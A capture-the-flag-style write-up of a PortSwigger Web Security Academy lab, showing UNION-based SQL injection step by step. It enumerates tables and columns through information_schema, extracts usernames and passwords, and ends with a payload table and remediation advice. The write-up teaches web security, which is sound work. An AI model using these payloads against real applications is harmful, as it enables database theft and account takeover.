<div align="center">

![Status](https://img.shields.io/badge/status-solved-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/platform-PortSwigger-orange?style=flat-square&logo=burpsuite&logoColor=white)
![Type](https://img.shields.io/badge/attack-SQL%20Injection-red?style=flat-square)
![Technique](https://img.shields.io/badge/technique-UNION%20Based-blue?style=flat-square)
![Year](https://img.shields.io/badge/year-2026-gray?style=flat-square)

<h1> SQL Injection — Listing Database Contents (Non-Oracle)</h1>
<p><em>UNION-based extraction of usernames and passwords via information_schema enumeration</em></p>

[PortSwigger Lab](#) · [Report Bug](#) · [View Writeup](#)

</div>

---

## Table of Contents

- [Overview](#overview)
- [Lab Objective](#lab-objective)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Attack Methodology](#attack-methodology)
  - [Step 1 — Column Count Enumeration](#step-1--column-count-enumeration)
  - [Step 2 — Listing All Tables](#step-2--listing-all-tables)
  - [Step 3 — Listing Columns in Target Table](#step-3--listing-columns-in-target-table)
  - [Step 4 — Extracting Credentials](#step-4--extracting-credentials)
  - [Step 5 — Login as Administrator](#step-5--login-as-administrator)
- [Payloads Reference](#payloads-reference)
- [Screenshots](#screenshots)
- [Key Takeaways](#key-takeaways)
- [Remediation](#remediation)
- [Author](#author)

---

## Overview

This writeup documents the exploitation of a **UNION-based SQL injection** vulnerability found in the product category filter of a PortSwigger Web Security Academy lab. The vulnerability allows an attacker to enumerate the database schema via `information_schema` and extract plaintext credentials from the users table.

The lab simulates a real-world scenario where unsanitized user input is concatenated directly into a SQL query, and query results are reflected in the HTTP response — enabling in-band data extraction.

---

## Lab Objective

> Exploit the SQL injection vulnerability in the `category` filter parameter to enumerate database tables, identify the users table, extract all usernames and passwords, and log in as the `administrator` user.

- **Vulnerability Location:** `/filter?category=` parameter
- **Database Type:** Non-Oracle (PostgreSQL / MySQL)
- **Attack Type:** UNION-based SQL Injection
- **Target Table:** `users_cbcldv`

---

## Vulnerability Analysis

The application constructs a backend query similar to:

```sql
SELECT name, description FROM products WHERE category = '[USER INPUT]'
```

User input is injected directly without parameterization. A single quote `'` terminates the string literal, and a `UNION SELECT` clause appends attacker-controlled query results to the legitimate response. The `--` sequence comments out the remainder of the original query.

**Conditions met for UNION attack:**

- Query results are returned in the application response (in-band)
- The number of columns and their data types can be matched
- `information_schema` is accessible (non-Oracle database)

---

## Attack Methodology

### Step 1 — Column Count Enumeration

Determine how many columns the original query returns by incrementally adding `NULL` values until no error is thrown:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

Two `NULL`s returned a valid response — confirming **2 columns**.

---

### Step 2 — Listing All Tables

Query `information_schema.tables` to enumerate all user-defined tables in the database:

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Full URL:**

```
https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27union+select+table_name,null+from+information_schema.tables--
```

The response listed all tables. Target identified: **`users_cbcldv`**

---

### Step 3 — Listing Columns in Target Table

Query `information_schema.columns` filtered by the target table name to identify column names:

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--
```

**Full URL:**

```
https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_cbcldv%27--
```

Columns returned: `username_abcxyz`, `password_abcxyz`

---

### Step 4 — Extracting Credentials

With table and column names confirmed, extract all rows:

```sql
' UNION SELECT username_abcxyz,password_abcxyz FROM users_cbcldv--
```

The response returned all username/password pairs including the `administrator` account.

---

### Step 5 — Login as Administrator

Used the extracted `administrator` credentials to authenticate at the application's login endpoint and solve the lab.

---

## Payloads Reference

| Step                | Payload                                                                                             |
| ------------------- | --------------------------------------------------------------------------------------------------- |
| Column count test   | `' UNION SELECT NULL,NULL--`                                                                        |
| List all tables     | `' UNION SELECT table_name,NULL FROM information_schema.tables--`                                   |
| List columns        | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--`                                      |

---

## Screenshots

**Listing Tables**

<img src="./evidence/Listing Tables.png" width="700" alt="Listing all tables via information_schema">

---

**Listing Password Columns**

<img src="./evidence/Listing password columns.png" width="700" alt="Enumerating columns in users_cbcldv table">

---

**Admin Password Extracted**

<img src="./evidence/admin password.png" width="700" alt="Administrator password extracted from database">

---

**Lab Solved**

<img src="./evidence/lab-solved.png" width="700" alt="Lab solved confirmation">

---

## Key Takeaways

- `information_schema` is available on all major non-Oracle databases (PostgreSQL, MySQL, MSSQL) and is the primary schema enumeration target in UNION attacks.
- Two-column queries with matching data types are required for a clean UNION injection — enumerate column count first.
- Reflected query output (in-band) is the prerequisite for UNION-based extraction; blind injection requires boolean/time-based approaches.
- URL-encoding special characters (`'` → `%27`, space → `+` or `%20`) is necessary when injecting via GET parameters.

---

## Remediation

| Issue                                    | Fix                                             |
| ---------------------------------------- | ----------------------------------------------- |
| Unsanitized user input in SQL query      | Use parameterized queries / prepared statements |
| Error messages revealing DB structure    | Suppress verbose database errors in production  |
| Credentials stored in plaintext          | Hash passwords with bcrypt / Argon2             |
| Unrestricted `information_schema` access | Apply least-privilege DB user permissions       |

---

## Author

**Michael Asante Anim** (`Aerixis`)

- GitHub: [@anim-michael-asante](https://github.com/anim-michael-asante)
- X: [@0x1aerixis](https://x.com/0x1aerixis)
- TryHackMe: [0x1aerixis](https://tryhackme.com/p/0x1aerixis)

---

<div align="center">
  <sub>PortSwigger Web Security Academy · SQL Injection Lab · 2026</sub>
</div>
